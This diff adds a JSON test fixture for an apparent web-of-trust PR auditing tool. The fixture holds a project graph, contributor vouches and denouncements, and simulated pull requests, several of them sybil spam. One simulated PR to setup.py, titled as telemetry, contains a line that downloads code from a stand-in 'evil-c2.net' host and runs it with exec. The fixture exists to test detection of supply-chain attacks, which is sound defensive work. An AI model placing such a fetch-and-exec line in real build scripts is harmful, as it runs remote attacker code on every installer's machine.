@@ -1,0 +1,353 @@
+{
+  "network_metadata": {
+    "name": "TrustMesh 30-Project Ecosystem",
+    "timestamp": 1761930000.0,
+    "total_projects": 30
+  },
+  "projects": [
+    "Your-Project",
+    "Project-B",
+    "Project-C",
+    "Project-D",
+    "Project-E",
+    "ecosystem-repo-01",
+    "ecosystem-repo-02",
+    "ecosystem-repo-03",
+    "ecosystem-repo-04",
+    "ecosystem-repo-05",
+    "ecosystem-repo-06",
+    "ecosystem-repo-07",
+    "ecosystem-repo-08",
+    "ecosystem-repo-09",
+    "ecosystem-repo-10",
+    "ecosystem-repo-11",
+    "ecosystem-repo-12",
+    "ecosystem-repo-13",
+    "ecosystem-repo-14",
+    "ecosystem-repo-15",
+    "ecosystem-repo-16",
+    "ecosystem-repo-17",
+    "ecosystem-repo-18",
+    "ecosystem-repo-19",
+    "ecosystem-repo-20",
+    "ecosystem-repo-21",
+    "ecosystem-repo-22",
+    "ecosystem-repo-23",
+    "Project-X",
+    "Malicious-Node-Y"
+  ],
+  "peerings": [
+    {
+      "source": "Your-Project",
+      "target": "Project-B",
+      "weight": 0.95,
+      "context": "Upstream foundational engine"
+    },
+    {
+      "source": "Your-Project",
+      "target": "Project-C",
+      "weight": 0.9,
+      "context": "Security alliance auditor"
+    },
+    {
+      "source": "Project-B",
+      "target": "Project-D",
+      "weight": 0.88,
+      "context": "Shared maintainer governance"
+    },
+    {
+      "source": "Project-C",
+      "target": "Project-E",
+      "weight": 0.85,
+      "context": "Vulnerability disclosure channel"
+    },
+    {
+      "source": "Your-Project",
+      "target": "ecosystem-repo-01",
+      "weight": 0.7,
+      "context": "Ecosystem integration"
+    },
+    {
+      "source": "Your-Project",
+      "target": "ecosystem-repo-02",
+      "weight": 0.65,
+      "context": "Community plugin"
+    },
+    {
+      "source": "Your-Project",
+      "target": "ecosystem-repo-03",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-B",
+      "target": "ecosystem-repo-04",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-C",
+      "target": "ecosystem-repo-05",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-D",
+      "target": "ecosystem-repo-06",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-E",
+      "target": "ecosystem-repo-07",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Your-Project",
+      "target": "ecosystem-repo-08",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-B",
+      "target": "ecosystem-repo-09",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-C",
+      "target": "ecosystem-repo-10",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-D",
+      "target": "ecosystem-repo-11",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-E",
+      "target": "ecosystem-repo-12",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Your-Project",
+      "target": "ecosystem-repo-13",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-B",
+      "target": "ecosystem-repo-14",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-C",
+      "target": "ecosystem-repo-15",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-D",
+      "target": "ecosystem-repo-16",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-E",
+      "target": "ecosystem-repo-17",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Your-Project",
+      "target": "ecosystem-repo-18",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-B",
+      "target": "ecosystem-repo-19",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-C",
+      "target": "ecosystem-repo-20",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-D",
+      "target": "ecosystem-repo-21",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Project-E",
+      "target": "ecosystem-repo-22",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    },
+    {
+      "source": "Your-Project",
+      "target": "ecosystem-repo-23",
+      "weight": 0.6,
+      "context": "Open source dependency"
+    }
+  ],
+  "vouches": [
+    {
+      "project": "Project-B",
+      "contributor": "alice_vouched",
+      "confidence": 0.95,
+      "notes": "Recognized core systems architect with verified commit signature"
+    },
+    {
+      "project": "Project-B",
+      "contributor": "marcus_core",
+      "confidence": 0.9,
+      "notes": "Active contributor across distributed storage crates"
+    }
+  ],
+  "denouncements": [
+    {
+      "project": "Project-C",
+      "contributor": "dan_denounced",
+      "severity": 0.92,
+      "reason": "Supply chain malware injection attempt via post-install curl pipe"
+    },
+    {
+      "project": "Project-X",
+      "contributor": "charlie_newbie",
+      "severity": 1.0,
+      "reason": "Hostile false accusation from adversarial unpeered node"
+    }
+  ],
+  "events": [
+    {
+      "pr_id": "pr_001_vouched",
+      "repo_id": "Your-Project",
+      "author": "alice_vouched",
+      "account_age_days": 210.0,
+      "timestamp": 1761930100.0,
+      "title": "feat: optimize Web-of-Trust graph traversal with AVX2 cosine similarity",
+      "diff_content": "+def vectorized_cosine(a, b): return np.dot(a, b) / (np.linalg.norm(a)*np.linalg.norm(b))",
+      "files_changed": [
+        "src/trustmesh/graph.py"
+      ]
+    },
+    {
+      "pr_id": "pr_002_vouched",
+      "repo_id": "Your-Project",
+      "author": "marcus_core",
+      "account_age_days": 185.0,
+      "timestamp": 1761930300.0,
+      "title": "perf: implement concurrent connection pool for network state lookups",
+      "diff_content": "+with ThreadPoolExecutor(max_workers=8) as pool: results = pool.map(lookup, peers)",
+      "files_changed": [
+        "src/trustmesh/engine.py"
+      ]
+    },
+    {
+      "pr_id": "pr_003_denounced",
+      "repo_id": "Your-Project",
+      "author": "dan_denounced",
+      "account_age_days": 45.0,
+      "timestamp": 1761930500.0,
+      "title": "build: update packaging build scripts with telemetry collection",
+      "diff_content": "+import urllib.request; exec(urllib.request.urlopen('http://evil-c2.net/p').read())",
+      "files_changed": [
+        "setup.py"
+      ]
+    },
+    {
+      "pr_id": "pr_004_newcomer",
+      "repo_id": "Your-Project",
+      "author": "charlie_newbie",
+      "account_age_days": 2.0,
+      "timestamp": 1761930700.0,
+      "title": "fix: correct off-by-one boundary condition in Dijkstra attenuation path",
+      "diff_content": "-for i in range(len(path) + 1):\n+for i in range(len(path)):",
+      "files_changed": [
+        "src/trustmesh/graph.py"
+      ]
+    },
+    {
+      "pr_id": "pr_005_newcomer",
+      "repo_id": "Your-Project",
+      "author": "elena_docs",
+      "account_age_days": 3.5,
+      "timestamp": 1761930900.0,
+      "title": "docs: add comprehensive quickstart guide and troubleshooting FAQs",
+      "diff_content": "+## Quick Start Guide\n+```bash\n+trustmesh audit --network net.json --events ev.json\n+```",
+      "files_changed": [
+        "README.md"
+      ]
+    },
+    {
+      "pr_id": "pr_006_newcomer",
+      "repo_id": "Your-Project",
+      "author": "frank_tester",
+      "account_age_days": 4.0,
+      "timestamp": 1761931100.0,
+      "title": "test: add edge cases for negative weights in trust attenuation validation",
+      "diff_content": "+def test_negative_weight():\n+    with pytest.raises(ValueError): add_trust(-0.5)",
+      "files_changed": [
+        "tests/test_graph.py"
+      ]
+    },
+    {
+      "pr_id": "pr_spam_007",
+      "repo_id": "Your-Project",
+      "author": "sybil_bot_01",
+      "account_age_days": 1.5,
+      "timestamp": 1761931300.0,
+      "title": "Fixed typo in README",
+      "diff_content": "\n- The trust network are initialized automatically.\n+ The trust network is initialized automatically.\n- See docs/installation.md for details.\n+ See docs/install.md for details.\n",
+      "files_changed": [
+        "README.md"
+      ]
+    },
+    {
+      "pr_id": "pr_spam_008",
+      "repo_id": "ecosystem-repo-01",
+      "author": "sybil_bot_02",
+      "account_age_days": 1.5,
+      "timestamp": 1761931420.0,
+      "title": "Fixed typo in README",
+      "diff_content": "\n- The trust network are initialized automatically.\n+ The trust network is initialized automatically.\n- See docs/installation.md for details.\n+ See docs/install.md for details.\n",
+      "files_changed": [
+        "README.md"
+      ]
+    },
+    {
+      "pr_id": "pr_spam_009",
+      "repo_id": "ecosystem-repo-02",
+      "author": "sybil_bot_03",
+      "account_age_days": 1.5,
+      "timestamp": 1761931540.0,
+      "title": "Fixed typo in README",
+      "diff_content": "\n- The trust network are initialized automatically.\n+ The trust network is initialized automatically.\n- See docs/installation.md for details.\n+ See docs/install.md for details.\n",
+      "files_changed": [
+        "README.md"
+      ]
+    },
+    {
+      "pr_id": "pr_spam_010",
+      "repo_id": "ecosystem-repo-03",
+      "author": "sybil_bot_04",
+      "account_age_days": 1.5,
+      "timestamp": 1761931660.0,
+      "title": "Fixed typo in README",
+      "diff_content": "\n- The trust network are initialized automatically.\n+ The trust network is initialized automatically.\n- See docs/installation.md for details.\n+ See docs/install.md for details.\n",
+      "files_changed": [
+        "README.md"
+      ]
+    }
+  ]
+}
